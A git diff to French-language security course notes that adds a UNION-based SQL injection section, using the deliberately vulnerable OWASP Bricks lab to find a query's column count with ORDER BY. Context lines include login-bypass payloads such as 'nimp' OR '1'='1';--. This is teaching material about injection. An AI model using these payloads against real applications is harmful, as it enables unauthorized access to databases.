@@ -229,3 +229,34 @@ Si on ne connait pas de nom d'utilisateur, on peut utiliser la syntaxe `xxx' OR 
 
 Injecter sans connaitre un utilisateur : `nimp' OR '1'='1';-- `
 
+
+# Injection avec UNION
+
+On va chercher à utiliser l'opérateur UNION pour extraire des données de la base SQL.
+
+## Déterminer le nombre de colonnes
+
+Prennons l'exemple de OWASP Bircks content 1.
+
+L'URL : `http://192.168.56.101/owaspbricks/content-1/index.php?id=1`.
+
+Effectue la requête :
+```
+SELECT * FROM users WHERE idusers=1 LIMIT 1
+```
+
+------------------------
+
+On utilise l'opérateur `ORDER BY` pour déterminer le nombre de colonnes.
+
+`http://192.168.56.101/owaspbricks/content-1/index.php?id=1+ORDER+BY+8` est valide, et correpond à la requête SQL
+
+```
+SELECT * FROM users WHERE idusers=1 ORDER BY 8 LIMIT 1
+```
+
+Néanmoins, dès que l'on dépasse le nombre de colonnes avec `ORDER BY 9`, l'application renvoie une erreur.
+
+![Injection avec un ORDER BY supérieur au nombre de colonnes de la requête](./images/order_by_9.png)
+
+On en déduit donc que la réponse à la requête SQL effectué par l'application ne contient que 8 colonnes.
